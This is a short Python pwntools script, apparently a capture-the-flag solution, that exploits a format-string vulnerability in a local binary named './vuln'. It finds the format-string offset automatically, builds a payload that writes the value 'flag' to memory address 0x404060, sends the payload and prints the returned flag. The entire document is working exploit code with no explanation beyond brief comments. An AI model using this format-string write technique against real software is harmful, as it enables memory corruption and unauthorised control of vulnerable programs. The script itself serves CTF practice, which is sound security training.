from pwn import *

context.log_level = "critical"
context.binary = ELF('./vuln')

# Start the local process
p = process('./vuln')

# Define the function to test format strings
def exec_fmt(payload):
    p = process('./vuln')
    p.sendline(payload)
    return p.recvall()

# Use autofmt to find the correct offset
autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

# Construct the payload to write 0x67616c66 ("flag" in ASCII) to address 0x404060
payload = fmtstr_payload(offset, {0x404060: 0x67616c66})

# Send the payload to the local process
p.sendline(payload)

# Receive and print the output
flag = p.recvall()
print("Flag:", flag.decode(errors='ignore'))

